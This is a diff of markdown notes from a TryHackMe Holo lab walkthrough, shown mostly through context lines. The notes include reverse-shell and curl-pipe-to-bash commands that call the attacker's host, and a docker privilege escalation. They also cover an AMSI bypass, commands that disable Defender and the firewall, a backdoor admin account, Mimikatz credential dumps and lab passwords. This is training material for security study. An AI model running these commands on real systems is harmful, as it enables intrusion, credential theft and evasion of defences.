@@ -2,7 +2,7 @@
 Holo is an Active Directory (AD) and Web-App attack lab that aims to teach core web attack vectors and more advanced AD attack techniques. This network simulates an external penetration test on a corporate network.
 ---
 
-![[download.png]]
+
 
 ### Intro Generation One
 
@@ -57,7 +57,6 @@ Another example could be a DLL that is used by an operating system, if this DLL 
 Net-NTLMv2 is a challenge-response authentication protocol used in various Microsoft network protocols, including SMB (Server Message Block). It is a secure version of the original NTLM protocol and is used to authenticate clients to servers in a Windows network. In SMB protocol, it is used to authenticate clients who are trying to access network resources on the server.
 
 ```
-
 
 ### Patching into the Matrix
 
@@ -225,7 +224,6 @@ DLL (Dynamic Link Library) es un tipo de archivo de sistema que contiene código
 "DLL Hijacking" es una técnica de explotación de seguridad en la que un atacante aprovecha una vulnerabilidad en la manera en la que una aplicación busca y carga una DLL específica para ejecutar código malicioso en el sistema objetivo. Este ataque se lleva a cabo mediante la colocación de una DLL maliciosa en un lugar específico donde la aplicación buscará y cargará automáticamente, en lugar de la DLL legítima.
 ```
 
-
 ### Flag Submission Panel
 
 ![](https://tryhackme-images.s3.amazonaws.com/room-icons/79023e1ed4c207bc52b7dfee208c80a5.png)  
@@ -336,7 +334,6 @@ Answer the questions below
 
 Read the above and prepare to apply .NET theory with C#.
 
-
 ```
 CLR (Common Language Runtime) is the execution engine of the .NET Framework. It provides a common runtime environment for all .NET languages, such as C# and VB.NET. It manages memory and thread allocation, garbage collection, and provides security and exception handling.
 
@@ -421,8 +418,6 @@ Answer the questions below
 Read the above and practice creating and building Visual Studio solutions.
 
  Completed
-
-![[Pasted image 20230130122437.png]]
 
 ### Initial Recon NOT EVERY GEEK WITH A COMMODORE 64 CAN HACK INTO NASA!
 
@@ -894,8 +889,6 @@ Nmap done: 1 IP address (1 host up) scanned in 44.93 seconds
 
 https://stackoverflow.com/questions/63556825/what-is-the-port-33060-for-mysql-server-ports-in-addition-to-the-port-3306
 
-
-
 ```
 
 What is the last octet of the IP address of the public-facing web server?
@@ -918,7 +911,6 @@ What is the HTTP title of the web server?
 
 *holo.live*
 
-
 ### Web App Exploitation Punk Rock 101 err Web App 101
 
 After scanning the Network range, you discover a public-facing Web server. You take to your keyboard as you begin enumerating the Web Application's attack surface. Your target is L-SRV01 found from initial reconnaissance.
@@ -940,8 +932,6 @@ Syntax: `wfuzz -u <URL> -w <wordlist> -H "Host: FUZZ.example.com" --hc <status 
 Now that we have some vhosts to work off from fuzzing, we need a way to access them. If you're in an environment where there is no DNS server, you can add the IP address followed by the FQDN of the target hosts to your _/etc/hosts_ file on Linux or _C:\\Windows\\System32\\Drivers\\etc\\hosts_ file if you're on Windows.   
 
 Answer the questions below
-
-![[Pasted image 20230130132958.png]]
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -1043,7 +1033,6 @@ Progress: 964 / 114442 (0.84%)^C
 └─$ cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt | grep "admin" | wc -l
 2318
 
-
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ sudo nano /etc/hosts
 
@@ -1062,11 +1051,7 @@ Progress: 964 / 114442 (0.84%)^C
 
 www.holo.live (load images)
 
-
 ```
-
-
-![[Pasted image 20230130135448.png]]
 
 What domains loads images on the first web page?
 
@@ -1164,7 +1149,6 @@ by Ben "epi" Risher 🤓                 ver: 2.7.2
 200      GET        0l        0w        0c http://admin.holo.live/db_connect.php
 200      GET       75l      158w     1845c http://admin.holo.live/index.php
 200      GET        4l        8w      135c http://admin.holo.live/robots.txt
-
 
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ feroxbuster -u http://dev.holo.live -w /usr/share/wordlists/dirb/common.txt -k -t 64 -x php -s 200
@@ -1316,10 +1300,7 @@ view-source:http://dev.holo.live/talents.php
 					</a>
 				</div>
 
-
-
 ```
-
 
 What file leaks the web server's current directory?
 
@@ -1332,7 +1313,6 @@ What file loads images for the development domain?
 What is the full path of the credentials file on the administrator domain?
 
 */var/www/admin/supersecretdir/creds.txt*
-
 
 ### Web App Exploitation LEEROY JENKINS!
 
@@ -1567,9 +1547,7 @@ Processed Requests: 877
 Filtered Requests: 800
 Requests/sec.: 30.78582
 
-
 ```
-
 
 What file is vulnerable to LFI on the development domain?
 
@@ -1592,7 +1570,6 @@ Using LFI on the development domain read the above file. What are the credential
 Use the vulnerable parameter to read the full path of the file.
 
 *admin:DBManagerLogin!*
-
 
 ### Web App Exploitation Remote Control Empanadas
 
@@ -1619,11 +1596,6 @@ To identify RCE, you can decide whether you want to fuzz parameters of files or 
 Once you have RCE on the system, you can use a reverse shell such as netcat to gain a shell on the box. Refer to the following cheat sheet for help with reverse shells. [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)  
 
 Answer the questions below
-
-![[Pasted image 20230131112334.png]]
-
-![[Pasted image 20230131120258.png]]
-
 
 ```
 view-source:http://admin.holo.live/dashboard.php
@@ -1735,7 +1707,6 @@ www-data@44e16cf97cc5:/var/www/admin$ reset
 
 ```
 
-
 What file is vulnerable to RCE on the administrator domain?
 
 Source code analysis or fuzzing parameters.
@@ -1753,7 +1724,6 @@ What user is the web server running as?
 whoami
 
 *www-data*
-
 
 ### Post Exploitation Meterpreter session 1 closed. Reason: RUH ROH
 
@@ -2078,7 +2048,6 @@ Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
 0.0.0.0         192.168.100.1   0.0.0.0         UG    0      0        0 eth0
 192.168.100.0   0.0.0.0         255.255.255.0   U     0      0        0 eth0
 
-
 www-data@44e16cf97cc5:/var/www/admin$ for i in {1..10000};do 2>/dev/null > /dev/tcp/192.168.100.1/$i && echo Port $i open;done
 0.1/$i && echo Port $i open;donell > /dev/tcp/192.168.100
 Port 22 open
@@ -2244,9 +2213,7 @@ SELECT host,User,authentication_string FROM mysql.user
 +-----------+------------------+------------------------------------------------------------------------+
 7 rows in set (0.00 sec)
 
-
 ```
-
 
 ### Docker Breakout Making Thin Lizzy Proud
 
@@ -2327,7 +2294,6 @@ www-data
 #!/bin/bash
 bash -i >& /dev/tcp/10.50.104.206/5555 0>&1
 
-
 curl 'http://192.168.100.1:8080/shell.php?cmd=curl http://10.50.104.206:8000/rev.sh|bash &'
 
 url encode
@@ -2361,9 +2327,7 @@ www-data@ip-10-200-108-33:/var/www$ cat user.txt
 cat user.txt
 HOLO{3792d7d80c4dcabb8a533afddf06f666}
 
-
 ```
-
 
 Read the above and exploit the database.
 
@@ -2528,11 +2492,9 @@ ubuntu              18.04               56def654ec22        2 years ago         
 
 gtfobins
 
-
 sudo install -m =xs $(which docker) .
 
 ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-
 
 /usr/bin/docker run -v /:/mnt --rm -it 56def654ec22 chroot /mnt sh
 
@@ -2582,10 +2544,7 @@ root@85e950a1a8ca:~# cat root.txt         cat root.txt
 cat root.txt
 HOLO{e16581b01d445a05adb2e6d45eb373f7}
 
-
-
 ```
-
 
 What is the full path of the binary with an SUID bit set on L-SRV01?
 
@@ -2602,8 +2561,6 @@ gtfobins
 Escalate privileges and submit root flag to Task 4.
 
 *HOLO{e16581b01d445a05adb2e6d45eb373f7}*
-
-![[Pasted image 20230131215953.png]]
 
 ### Post Exploitation From the Shadows
 
@@ -2711,7 +2668,6 @@ cat authorized_keys
 no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwAH4BS4b+rdtLqwwIBFUCTjLnA0HLYETxBjWLJnrmXoWIvq6M1oxX154NhG10DDmBaYjgCMQllCFaUDIMlZoNMJvqeYbDgt/B51v47c0SCaQnu4nQapgUQqjhwlTp3Humj7bvvKZHV2ATcZdLOK6E170YvdweMTjrI9n3L5AyZTsoSV7vlHCYmNH60SGG0JWGNRLT0ddpTP+ZY4g6RvfFFh/dwryoZXn2xmbdK44okuYgWU5BLBbMR0S8HmVf5lE+g7K3kc/a7k+A36zSjt+Ay/rxstFAmL7gJcRw4+33alsi0HvTh3Q7Nt4y3GWGySML51JwMQL/jQESIBuMnMgv ad-network
 no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCMLOT6NhiqH5Rp36qJt4jZwfvb/H/+YLRTrx5mS9dSyxumP8+chjxkSNOrdgNtZ6XoaDDDikslQvKMCqoJqHqp4jh9xTQTj29tagUaZmR0gUwatEJPG0SfqNvNExgsTtu2DW3SxCQYwrMtu9S4myr+4x+rwQ739SrPLMdBmughB13uC/3DCsE4aRvWL7p+McehGGkqvyAfhux/9SNgnIKayozWMPhADhpYlAomGnTtd8Cn+O1IlZmvqz5kJDYmnlKppKW2mgtAVeejNXGC7TQRkH6athI5Wzek9PXiFVu6IZsJePo+y8+n2zhOXM2mHx01QyvK2WZuQCvLpWKW92eF amiOpenVPN
 
-
 root@85e950a1a8ca:~/.ssh# echo "ssh-rsa AAAAB3NzaC1yecho "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDApCxN/8yQ80PPTaxAyPK1MtnGXwXXHGeU1Z4EEjoBO0ytje16zRvMK5SplHJbaE9UWLSdfVioewXbv0yFsphkO2ex5njB/jfyjuCK8Jhzm/xSOcGMlgr3Ew9/U/Nq2eS8DWP2HbB9KG5IC7F0GnROGEvkIOJUTddEKL7aBUE0Xz/RxjMeaZ+DKbbB9zDwGRGC1bN9Xzl79vnqRHGV7Q9jgCQdcBvMDIBHjTS/MboY04xIh48jmSXRKVd8Xp9WMlK9YTXmha3KIOgEZaQp+XcFWnB812ns1v3OIM+tq9KElglz5Q65czn9Szw4vu/OFxgvYozwpH7pxeX8wb+oFszr6NMbTFx+vZyzneXP2jlZ9ckV+GIZgDEE08SP9lqaG36+CvEIWNxeLJHmA4h9xpb59HKaflULU9TNmPyzIoI1RNfOBOiDzJ3ce1OKKDa2nG96dKPGpdxSie/zezi82rUrXG9vyKIpLlUC2trFZT1NKsKfAEDWfB28M+MpPd4k/a8=" >> authorized_keys
 
 root@85e950a1a8ca:~/.ssh# cat authorized_keys       cat authorized_keys
@@ -2768,11 +2724,9 @@ drwxr-xr-x  2 hacker      hacker      4096 Feb  1 03:19 hacker
 drwxr-xr-x  4 linux-admin linux-admin 4096 Feb  1 03:12 linux-admin
 drwxr-xr-x  4 ubuntu      ubuntu      4096 Dec  9  2020 ubuntu
 
-
 This command appears to be changing the password for a user named "hacker" to "hacker". The "chpasswd" command is used to change passwords for multiple users in a batch mode, and the input to the command is in the format of "username:password". So in this example, the password for the "hacker" user is being set to "hacker".
 
 echo hacker:hacker | chpasswd
-
 
 now using hashcat
 
@@ -2814,7 +2768,6 @@ linuxadmin:linuxrulez
 
 ```
 
-
 Read the above and dump the shadow file on L-SRV01.
 
  Completed
@@ -2822,7 +2775,6 @@ Read the above and dump the shadow file on L-SRV01.
 What non-default user can we find in the shadow file on L-SRV01?
 
 *linux-admin*
-
 
 ### Post Exploitation Crack all the Things
 
@@ -3041,7 +2993,6 @@ Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1030-aws x86_64)
 11 of these updates are security updates.
 To see these additional updates run: apt list --upgradable
 
-
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 
@@ -3207,13 +3158,7 @@ linux-admin@10.200.108.33's password:
 
 and visit login page http://10.200.108.31/ (without foxyproxy activated)
 
-
-
 ```
-
-![[Pasted image 20230201140859.png]]
-
-![[Pasted image 20230201141120.png]]
 
 ### Command and Control Command your Foes and Control your Friends
 
@@ -3347,8 +3292,6 @@ Submodule path 'Covenant/Data/ReferenceSourceLibraries/SharpWMI': checked out 'f
 3.1.426 [/usr/share/dotnet/sdk]
 6.0.404 [/usr/share/dotnet/sdk]
 
-
-
 ┌──(kali㉿kali)-[~/Holo]
 └─$ wget https://dotnet.microsoft.com/download/dotnet/scripts/v1/dotnet-install.sh
 --2023-02-01 15:21:55--  https://dotnet.microsoft.com/download/dotnet/scripts/v1/dotnet-install.sh
@@ -3443,9 +3386,6 @@ warn: Microsoft.AspNetCore.DataProtection.KeyManagement.XmlKeyManager[35]
 go to https://127.0.0.1:7443  and register quickly
 ```
 
-![[Pasted image 20230201153402.png]]
-
-
 ### Command and Control Bug on the Wire
 
 Now that we have Covenant set up and signed in, we can begin covering the basics of operating and creating a listener with Covenant. This will be helpful later when you get onto a Windows box and deploy a grunt quickly.  
@@ -3504,8 +3444,6 @@ Read the above and create a listener within Covenant.
 
  Completed
 
-![[Pasted image 20230201155806.png]]
-
 ### Command and Control The Blood Oath
 
 Now that we have a listener in Covenant, we can create a launcher to deploy a grunt. Again, this will be helpful later when you get onto a Windows box and need to deploy a grunt quickly.  
@@ -3558,8 +3496,6 @@ Answer the questions below
 Read the above and practice building a launcher.
 
  Completed
-
-![[Pasted image 20230201162433.png]]
 
 ### Command and Control We ran out of Halo and YAML references...
 
@@ -3696,7 +3632,6 @@ Read the above and practice converting offensive tools to Covenant tasks.
 
  Completed
 
-
 ### Web App Exploitation Hide yo' Kids, Hide yo' Wives, Hide yo' Tokens
 
 Now that we have access to the internal network and have identified a new target, S-SRV01. We know that S-SRV01 has an open web server that we can look at to begin our attack.  
@@ -3760,8 +3695,6 @@ login
 http://10.200.108.31/home.php
 ```
 
-![[Pasted image 20230201165120.png]]
-
 What user can we control for a password reset on S-SRV01?
 
 *gurag*
@@ -3781,7 +3714,6 @@ What page does the reset redirect you to when successfully authenticated on S-SR
 You may need to refresh the page before you can get a working reset token.
 
 *reset.php*
-
 
 ###  Web App Exploitation Thanks, I'll let myself in.
 
@@ -3833,8 +3765,6 @@ Answer the questions below
 Read the above and attempt a client-side filter bypass on S-SRV01.
 
  Completed
-
-![[Pasted image 20230201170114.png]]
 
 ```php
 http://10.200.108.31/img_upload.php?
@@ -3946,7 +3876,6 @@ or using chisel
 
 gobuster dir -u http://10.200.108.31 -w /usr/share/dirb/wordlists/common.txt -p socks5://127.0.0.1:1080
 
-
 found it
 http://10.200.108.31/images/
 
@@ -3988,7 +3917,6 @@ C:\Users\Administrator\Desktop>dir
 
 C:\Users\Administrator\Desktop>type root.txt
 HOLO{50f9614809096ffe2d246e9dd21a76e1}
-
 
 it works !! 
 
@@ -4043,16 +3971,7 @@ http://10.200.108.31/images/rev_2.php?cmd=whoami
 
 nt authority\system
 
-
-
-
 ```
-
-![[Pasted image 20230201173038.png]]
-
-![[Pasted image 20230201173905.png]]
-
-![[Pasted image 20230201174309.png]]
 
 ### AV Evasion Basically a joke itself....
 
@@ -4118,7 +4037,6 @@ Read the above and investigate how AMSI is instrumented.
 
  Completed
 
-
 ### AV Evasion THEY WONT SEE ME IF I YELL!
 
 Now that we understand the basics of AMSI and how its instrumented, we can begin bypassing AMSI using PowerShell and C#.  
@@ -4163,7 +4081,6 @@ Finally, the code overwrites 6 bytes of the "AmsiScanBuffer" function with a cus
 This code can be dangerous as it modifies the behavior of a security feature in the system. This can potentially allow malicious scripts to run on a system without being detected by antimalware software. This can pose a security risk and should only be done in controlled environments where the consequences are understood and accepted. In general, it is recommended to keep the AMSI feature enabled for security purposes.
 
 ```
-
 
 This may seem like a lot of fancy and chopped-up code if you are unfamiliar with Windows architecture and PowerShell, but we can break it up and identify what each section of code does.  
 
@@ -4216,11 +4133,7 @@ function Bypass-AMSI
     if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {
 ....
 
-
 ```
-
-![[Pasted image 20230201182228.png]]
-
 
 ### AV Evasion AMSIception
 
@@ -4329,9 +4242,7 @@ AmsiTrigger.exe  bypass-test.ps1  dotnet-install.sh  hash            rev.php
 bash_scan.sh     chisel           fake_id_rsa        python_scan.py  rev.sh
 bypass-AMSI.ps1  Covenant         fake_id_rsa.pub    rev_2.php
 
-
 ```
-
 
 ### AV Evasion JU57 0BFU$C47E 1T
 
@@ -4390,9 +4301,7 @@ Read the above and attempt to obfuscate your payload to evade AV.
 PS C:\Scripts> Invoke-WebRequest http://10.50.104.206:1337/AmsiTrigger.exe -outfile c:\Scripts\AmsiTrigger.exe
 PS C:\Scripts> ls
 
-
     Directory: C:\Scripts
-
 
 Mode                LastWriteTime         Length Name                                                                  
 ----                -------------         ------ ----                                                                  
@@ -4405,7 +4314,6 @@ Mode                LastWriteTime         Length Name
 Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 10.200.108.31 - - [01/Feb/2023 19:09:37] "GET /AmsiTrigger.exe HTTP/1.1" 200 -
 10.200.108.31 - - [01/Feb/2023 19:12:24] "GET /bypass-test.ps1 HTTP/1.1" 200 -
-
 
 PS C:\Scripts> Invoke-WebRequest http://10.50.104.206:1337/bypass-test.ps1 -outfile c:\Scripts\bypass-test.ps1
 
@@ -4439,10 +4347,7 @@ $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0
 
 [system.runtime.interopservices.marshal]::copy("
 
-
-
 ```
-
 
 ###  AV Evasion 'Ca' + 'n' + 'you' + ' ' + 'see' + 'me now' + '?'
 
@@ -4499,7 +4404,6 @@ Read the above and attach your clean AMSI bypass to the payload to evade detecti
 Submit the flags from S-SRV01 in Task 4.
 
  Completed
-
 
 ```
 ┌──(kali㉿kali)-[~/Holo]
@@ -4560,9 +4464,6 @@ Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 PS C:\Scripts> Invoke-WebRequest http://10.50.104.206:1337/CommandLine.dll -outfile c:\Scripts\CommandLine.dll
 PS C:\Scripts> Invoke-WebRequest http://10.50.104.206:1337/CommandLine.xml -outfile c:\Scripts\CommandLine.xml
 PS C:\Scripts> Invoke-WebRequest http://10.50.104.206:1337/ThreatCheck.exe -outfile c:\Scripts\ThreatCheck.exe
-
-
-
 
 ```
 
@@ -4658,7 +4559,6 @@ Answer the questions below
 ```powershell
 First Creating Persistence Access
 
-
 net user hacker hackP@ssw0rd /add
 
 net localgroup administrators hacker /add
@@ -4666,7 +4566,6 @@ net localgroup administrators hacker /add
 netsh advfirewall set allprofiles state off
 
 net localgroup "Remote Desktop Users" Everyone /Add
-
 
 Defense Evasion
 
@@ -4682,7 +4581,6 @@ Removing this registry key and its subkeys can potentially impact the security o
 
 PS C:\web\htdocs\images> Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
 
-
 The commands `Set-MpPreference -DisableIOAVProtection $true` and `Set-MpPreference -DisableRealtimeMonitoring 1` are similar in that they both disable protection features in Microsoft Defender Antivirus. However, they are different in their specific purpose.
 
 `Set-MpPreference -DisableIOAVProtection $true` disables the Integrated Object AV (IOAV) protection feature, which helps to protect against malicious files and other threats that can enter a system through the internet or other means.
@@ -4696,7 +4594,6 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 Disabling either of these features can make the device more vulnerable to malicious threats, so it is important to only do so if it is necessary for a specific task or use case.
 
 PS C:\web\htdocs\images> Set-MpPreference -DisableRealtimeMonitoring $true
-
 
 Now using Mimikatz
 
@@ -5001,10 +4898,7 @@ Bye!
 
 watamet: Nothingtoworry!
 
-
-
 ```
-
 
 Read the above and attempt to dump credentials on S-SRV01.
 
@@ -5017,7 +4911,6 @@ What domain user's credentials can we dump on S-SRV01?
 What is the domain user's password that we can dump on S-SRV01?
 
 *Nothingtoworry!*
-
 
 ### Post Exploitation Good Intentions, Courtesy of Microsoft: Part II
 
@@ -5129,12 +5022,7 @@ smb: \watamet\Desktop\> exit
 └─$ cat user.txt                                                                               
 HOLO{2cb097ab8c412d565ec3cab49c6b082e} 
 
-
-
-
-
 ```
-
 
 Read the above and attempt to pass the hash.
 
@@ -5224,7 +5112,6 @@ PS C:\Users\watamet> ipconfig
 
 Windows IP Configuration
 
-
 Ethernet adapter Ethernet:
 
    Connection-specific DNS Suffix  . : holo.live
@@ -5302,9 +5189,7 @@ PS C:\Users\watamet\Desktop> .\applocker-bypass-checker.ps1
 
 PS C:\Users\watamet\Desktop> cd C:\Windows\Tasks
 
-
 S C:\Windows\Tasks> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-
 
 PublisherConditions : {*\*\*,0.0.0.0-*}
 PublisherExceptions : {}
@@ -5347,10 +5232,7 @@ Description         : Allows members of the local Administrators group to run al
 UserOrGroupSid      : S-1-5-32-544
 Action              : Allow
 
-
 ```
-
-![[Pasted image 20230201234727.png]]
 
 Read the above and bypass AppLocker on PC-FILESRV01.
 
@@ -5464,11 +5346,9 @@ Resolving deltas: 100% (472/472), done.
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.200.95.35 - - [06/Feb/2023 20:54:14] "GET /Seatbelt.exe HTTP/1.1" 200 -
 
-
 PS C:\Windows\Tasks> Invoke-WebRequest http://10.50.74.15:8000/Seatbelt.exe -outfile C:\Windows\Tasks\Seatbelt.exe
 
 PS C:\Windows\Tasks> .\SeatBelt.exe -group=all > C:\Users\watamet\Desktop\output.txt
-
 
 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000##%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
 #%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
@@ -5480,7 +5360,6 @@ PS C:\Windows\Tasks> .\SeatBelt.exe -group=all > C:\Users\watamet\Desktop\output
                         &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                         &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,                                 
                          #%%%%##,                                                                                 
-
 
 ====== AMSIProviders ======
 
@@ -5499,7 +5378,6 @@ Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available 
 
     [*] Dll not configured
   [*] AppIDSvc service is Running
-
 
     [*] Exe is in Enforce Mode
       [*] <FilePublisherRule Id="a9e18c21-ff8f-43cf-b9fc-db40eed693ba" Name="(Default Rule) All signed packaged apps" Description="Allows members of the Everyone group to run packaged apps that are signed." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="*" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="0.0.0.0" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>
@@ -5526,7 +5404,6 @@ Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available 
     Internet Address      Physical Address      Type
     224.0.0.22            00-00-00-00-00-00     Static
 
-
   Ethernet --- Index 6
     Interface Description : AWS PV Network Device #0
     Interface IPs      : fe80::b0db:4d99:84af:ac44%6, 10.200.95.35
@@ -5544,13 +5421,11 @@ Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available 
     224.0.0.252           01-00-5E-00-00-FC     Static
     255.255.255.255       FF-FF-FF-FF-FF-FF     Static
 
-
 ====== AuditPolicies ======
 
 ====== AuditPolicyRegistry ======
 
 ====== AutoRuns ======
-
 
   HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
     C:\Windows\system32\SecurityHealthSystray.exe
@@ -5661,7 +5536,6 @@ History (C:\Users\watamet\AppData\Local\Google\Chrome\User Data\Default\History)
 
 ====== ChromiumPresence ======
 
-
   C:\Users\watamet\AppData\Local\Google\Chrome\User Data\Default\
 
     'History'     (4/7/2021 2:22:28 AM)  :  Run the 'ChromiumHistory' command
@@ -5745,13 +5619,11 @@ ERROR:   [!] Terminating exception running command 'CredEnum': System.ComponentM
     4/2/2021 10:28:39 PM      4/2/2021 10:28:39 PM      fa11aa6c-342d-43b4-a166-75548290dd00
     7/15/2021 5:00:56 PM      7/15/2021 5:00:56 PM      fcd5d784-f95c-40a4-9605-f84e0d4cb476
 
-
   [*] Use the Mimikatz "dpapi::masterkey" module with appropriate arguments (/pvk or /rpc) to decrypt
   [*] You can also extract many DPAPI masterkeys from memory with the Mimikatz "sekurlsa::dpapi" module
   [*] You can also use SharpDPAPI for masterkey retrieval.
 ====== Dsregcmd ======
 ====== PowerShell ======
-
 
   Installed CLR Versions
       4.0.30319
@@ -6020,7 +5892,6 @@ PS C:\Windows\Tasks> .\SharpEDRChecker.exe
 [!] Process Summary:
         [-] MsMpEng.exe : msmpeng
 
-
 [+] No suspicious modules found in your process
 
 [!] Directory Summary:
@@ -6029,7 +5900,6 @@ PS C:\Windows\Tasks> .\SharpEDRChecker.exe
         [-] C:\Program Files\Wireshark : wireshark
         [-] C:\Program Files (x86)\Windows Defender : defender
 
-
 [!] Service Summary:
         [-] mpssvc : defender
         [-] PolicyAgent : defender
@@ -6037,7 +5907,6 @@ PS C:\Windows\Tasks> .\SharpEDRChecker.exe
         [-] Sense : defender, threat
         [-] WdNisSvc : antivirus, defender, nissrv
         [-] WinDefend : antimalware, antivirus, defender, malware, msmpeng
-
 
 [!] Driver Summary:
         [-] WdFilter.sys : antimalware, malware
@@ -6062,7 +5931,6 @@ What anti-virus product is employed on PC-FILESRV01?
 Found in almost all checks.
 
 *Windows Defender*
-
 
 ### Situational Awareness SEATBELT CHECK!
 
@@ -6106,7 +5974,6 @@ Answer the questions below
 ```
 PS C:\Windows\Tasks> .\Seatbelt.exe all
 
-
                         %&&@@@&&
                         &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                         &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
@@ -6121,15 +5988,12 @@ PS C:\Windows\Tasks> .\Seatbelt.exe all
                         &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,
                          #%%%%##,
 
-
 ERROR: Error running command "all"
-
 
 [*] Completed collection in 0.009 seconds
 
 PS C:\Windows\Tasks> .\Seatbelt.exe -all
 
-
                         %&&@@@&&
                         &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                         &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
@@ -6144,15 +6008,12 @@ PS C:\Windows\Tasks> .\Seatbelt.exe -all
                         &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,
                          #%%%%##,
 
-
 ERROR: Error running command "-all"
-
 
 [*] Completed collection in 0.008 seconds
 
 PS C:\Windows\Tasks> .\Seatbelt.exe -group=system
 
-
                         %&&@@@&&
                         &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                         &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
@@ -6166,7 +6027,6 @@ PS C:\Windows\Tasks> .\Seatbelt.exe -group=system
                         &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                         &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,
                          #%%%%##,
-
 
 ====== AMSIProviders ======
 
@@ -6185,7 +6045,6 @@ Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available 
 
     [*] Dll not configured
   [*] AppIDSvc service is Running
-
 
     [*] Exe is in Enforce Mode
       [*] <FilePublisherRule Id="a9e18c21-ff8f-43cf-b9fc-db40eed693ba" Name="(Default Rule) All signed packaged apps" Description="Allows members of the Everyone group to run packaged apps that are signed." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="*" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="0.0.0.0" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>
@@ -6212,7 +6071,6 @@ Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available 
     Internet Address      Physical Address      Type
     224.0.0.22            00-00-00-00-00-00     Static
 
-
   Ethernet --- Index 6
     Interface Description : AWS PV Network Device #0
     Interface IPs      : fe80::b0db:4d99:84af:ac44%6, 10.200.95.35
@@ -6230,13 +6088,11 @@ Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available 
     224.0.0.252           01-00-5E-00-00-FC     Static
     255.255.255.255       FF-FF-FF-FF-FF-FF     Static
 
-
 ====== AuditPolicies ======
 
 ====== AuditPolicyRegistry ======
 
 ====== AutoRuns ======
-
 
   HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
     C:\Windows\system32\SecurityHealthSystray.exe
@@ -6488,7 +6344,6 @@ Zone Auth Settings
 
 Non-empty Local Groups (and memberships)
 
-
   ** PC-FILESRV01\Administrators ** (Administrators have complete and unrestricted access to the computer/domain)
 
   User            PC-FILESRV01\Administrator               S-1-5-21-4241685735-4112329853-1893400299-500
@@ -6560,7 +6415,6 @@ Non-empty Local Groups (and memberships)
 ====== LogonSessions ======
 
 Logon Sessions (via WMI)
-
 
   UserName              : watamet
   Domain                : HOLOLIVE
@@ -6674,7 +6528,6 @@ ERROR: Unable to collect. Must be an administrator.
   Session Security
       NTLMMinClientSec        : 536870912 (Require128BitKey)
       NTLMMinServerSec        : 536870912 (Require128BitKey)
-
 
   NTLM Auditing and Restrictions
       InboundRestrictions     : (Not defined)
@@ -6790,7 +6643,6 @@ Powered On Events (Time is local time)
   2/2/2023 9:55:05 PM     :  shutdown
   2/2/2023 8:23:06 PM     :  startup
 ====== PowerShell ======
-
 
   Installed CLR Versions
       4.0.30319
@@ -7080,15 +6932,12 @@ ERROR:   [!] Terminating exception running command 'WifiProfile': System.DllNotF
 
 Locally-defined Settings:
 
-
-
 GPO-defined Settings:
 ====== WindowsEventForwarding ======
 
 ====== WindowsFirewall ======
 
 Collecting Windows Firewall Non-standard Rules
-
 
 Location                     : SOFTWARE\Policies\Microsoft\WindowsFirewall
 
@@ -7204,11 +7053,8 @@ Standard Profile
   AlternateServer                :
